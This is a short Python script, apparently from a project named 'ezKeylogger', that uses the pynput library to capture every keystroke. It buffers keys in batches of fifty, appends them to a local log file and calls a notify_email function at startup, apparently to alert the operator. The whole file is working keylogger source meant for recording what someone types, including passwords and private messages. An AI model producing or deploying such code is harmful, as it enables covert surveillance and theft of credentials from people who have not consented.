#imported from required library pynput
from pynput import keyboard
from pynput.keyboard import Key, Listener
from notify import notify_email


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    print("{0} pressed".format(key))

    if count >= 50:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("ezKeylogger/logs/log.txt", "a") as f:
        for key in keys:
            key = str(key).replace("'","")
            if key.find("space") > 0:
                f.write("\n")
            elif key.find("Key"):
                f.write(key)

notify_email()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()